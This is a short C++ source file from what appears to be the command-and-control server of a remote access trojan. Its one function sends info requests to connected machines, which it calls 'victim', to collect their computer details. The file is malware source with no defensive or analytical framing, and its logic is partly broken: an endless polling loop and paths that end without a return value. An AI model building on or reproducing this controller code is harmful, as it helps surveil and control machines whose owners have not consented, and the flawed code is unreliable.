#include "..\Library\precompile.h"
#include "..\Library\tcp_server.h"

bool tcp_server::request_info(client& victim, bool request)
{
	// Requesting 

	if (request) {
		if (valid_client(victim)) {

			//Since this info does not update too often this makes sure that it will only update if the values are empty

			if (!std::all_of(victim.computer_info.begin(), victim.computer_info.end(), [&](std::pair<std::string, std::string> const& i) {return victim.computer_info.begin()->second == i.second; })) {
				console << "[*] Everything has a value so no need to update\n";
				std::cout << "No need to update a full map" << std::endl;
				return false;
			}

			console << "[~] Requesting information from " << victim.name << "\n";

			for (auto keyval : victim.computer_info) {

				console << "    " << keyval.first << " - ";
				if (tcp_server::send(victim, keyval.first, "Info Request")) {
					console << "Requesting...\n";
				}
				else {
					console << "Failed.\n";
				}

			}

		}
		else {
			return false;
		}
	}

	// Fetching value

	else {
		while (true) {
			for (auto i : victim.packet_queue) {
				std::cout << i << std::endl;
			}
			std::cout << "restarting" << std::endl;
			Sleep(1000);
		}
	}

}